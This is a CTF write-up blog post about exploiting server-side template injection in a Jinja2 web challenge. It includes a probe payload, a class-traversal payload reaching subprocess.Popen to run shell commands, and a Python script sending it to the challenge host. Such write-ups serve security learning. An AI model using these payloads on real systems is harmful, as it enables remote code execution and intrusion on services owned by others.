---
layout: post
title: "CTF Writeup: Modern Web Exploitation Challenge"
date: 2026-09-01
categories: [CTF, Web]
tags: [Web, Python, SSTI, Jinja2]
platform: CTF
difficulty: Medium
description: "Detailed solution for a web challenge involving Server-Side Template Injection (SSTI) in Jinja2 to gain remote code execution."
---

{% raw %}
## Challenge Summary

- **Category**: Web
- **Difficulty**: Medium
- **Event**: Internal Research CTF

---

## 01 — Reconnaissance

The target application takes user input via a GET parameter `name` and renders it inside a template:

```http
GET /greeting?name={{7*7}} HTTP/1.1
Host: ctf.challenge.local
```

Response:
```html
<h1>Hello 49</h1>
```

The expression `{{7*7}}` evaluated to `49`, confirming **Server-Side Template Injection (SSTI)** in Jinja2/Python.

---

## 02 — Exploitation

To escalate from template evaluation to arbitrary code execution, we traverse Python class MRO (Method Resolution Order) to reach `subprocess.Popen`.

Payload construction:

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Scanning class indexes for `subprocess.Popen` (index 414 in target environment):

```python
{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt', shell=True, stdout=-1).communicate()[0].strip() }}
```

Final Exploit Script:

```python
import requests

url = "http://ctf.challenge.local/greeting"
payload = "{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /flag.txt', shell=True, stdout=-1).communicate()[0].strip() }}"

r = requests.get(url, params={"name": payload})
print("[+] Response:")
print(r.text)
```

Flag retrieved successfully.
{% endraw %}

